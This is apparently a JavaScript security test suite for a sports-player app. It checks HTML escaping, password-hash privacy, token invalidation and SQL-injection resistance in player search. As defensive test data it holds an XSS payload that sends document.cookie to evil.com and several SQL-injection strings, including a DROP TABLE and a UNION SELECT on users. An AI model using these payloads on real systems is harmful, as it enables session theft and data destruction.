import test from 'node:test';
import assert from 'node:assert/strict';
import { authService } from '../src/modules/auth/auth.service.js';
import { playersService } from '../src/modules/players/players.service.js';
import { db } from '../src/db/database.js';

function esc(v) {
  return String(v ?? '').replace(/[&<>"']/g, c => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  }[c]));
}

test('Security & Privacy — XSS Sanitization helper escapes dangerous HTML characters', () => {
  const dangerousScript = '<script>alert("XSS")</script>';
  const escapedScript = esc(dangerousScript);
  assert.equal(escapedScript, '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
  assert.ok(!escapedScript.includes('<script>'), 'Script tag must not remain raw');

  const dangerousImg = '<img src=x onerror="fetch(\'http://evil.com/steal?c=\'+document.cookie)">';
  const escapedImg = esc(dangerousImg);
  assert.ok(!escapedImg.includes('<img'), 'Image tag must be escaped');
  assert.ok(!escapedImg.includes('onerror="'), 'Event handler must be escaped');

  assert.equal(esc(null), '', 'null must resolve to empty string');
  assert.equal(esc(undefined), '', 'undefined must resolve to empty string');
  assert.equal(esc(42.5), '42.5', 'Numeric inputs must format safely');
});

test('Security & Privacy — Authentication never exposes password hashes or salts in user payloads', () => {
  const email = `sec_test_${Date.now()}@yardline.app`;
  const session = authService.register({
    email,
    password: 'SuperSecretPassword123!',
    displayName: 'Security Officer'
  });

  assert.ok(session.token, 'Session token must be generated');
  assert.ok(session.user, 'Session must return user DTO');
  assert.equal(session.user.password_hash, undefined, 'password_hash must NEVER be exposed in session.user');
  assert.equal(session.user.salt, undefined, 'salt must NEVER be exposed in session.user');
  assert.equal(session.user.email, email.toLowerCase(), 'Email must be normalized');

  // Validar retorno de validateToken
  const validatedUser = authService.validateToken(session.token);
  assert.ok(validatedUser, 'Valid token must resolve user');
  assert.equal(validatedUser.password_hash, undefined, 'validateToken must NEVER expose password_hash');
  assert.equal(validatedUser.salt, undefined, 'validateToken must NEVER expose salt');
});

test('Security & Privacy — Password hashes stored in DB use cryptographic scrypt with non-trivial salt', () => {
  const row = db.prepare('SELECT password_hash FROM users WHERE email LIKE ? LIMIT 1').get('sec_test_%');
  assert.ok(row, 'User record must exist in DB');
  assert.ok(row.password_hash.includes(':'), 'Password hash must be formatted as salt:derivedKey');
  const [salt, key] = row.password_hash.split(':');
  assert.ok(salt.length >= 32, 'Salt must have at least 16 bytes (32 hex characters)');
  assert.ok(key.length >= 64, 'Derived scrypt key must have at least 64 hex characters');
});

test('Security & Privacy — Invalid and logged out tokens are strictly rejected', () => {
  assert.equal(authService.validateToken(null), null, 'null token must be rejected');
  assert.equal(authService.validateToken(''), null, 'empty token must be rejected');
  assert.equal(authService.validateToken('forged_fake_token_12345'), null, 'forged token must be rejected');

  const email = `logout_test_${Date.now()}@yardline.app`;
  const session = authService.register({ email, password: 'PassWord123!', displayName: 'Logout Tester' });
  assert.ok(authService.validateToken(session.token), 'Token should be initially valid');

  authService.logout(session.token);
  assert.equal(authService.validateToken(session.token), null, 'Logged out token must be immediately rejected');
});

test('Security & Privacy — Parameterized SQL protects player search against SQL Injection attacks', () => {
  const sqlInjectionAttempts = [
    "' OR '1'='1",
    "'; DROP TABLE players; --",
    "\" OR 1=1 --",
    "Josh' UNION SELECT * FROM users --"
  ];

  sqlInjectionAttempts.forEach(attempt => {
    assert.doesNotThrow(() => {
      const res = playersService.searchPlayers({ q: attempt });
      assert.ok(Array.isArray(res.players), 'Search query should return a players array safely');
      assert.ok(res.total <= 10484, 'Search result total should be bounded');
    }, `Search must handle injection string "${attempt}" safely`);
  });

  // Garantir que a tabela players continua intacta após os testes de injeção
  const count = db.prepare('SELECT COUNT(*) as c FROM players').get();
  assert.ok(count.c > 10000, 'Players table must remain completely intact');
});
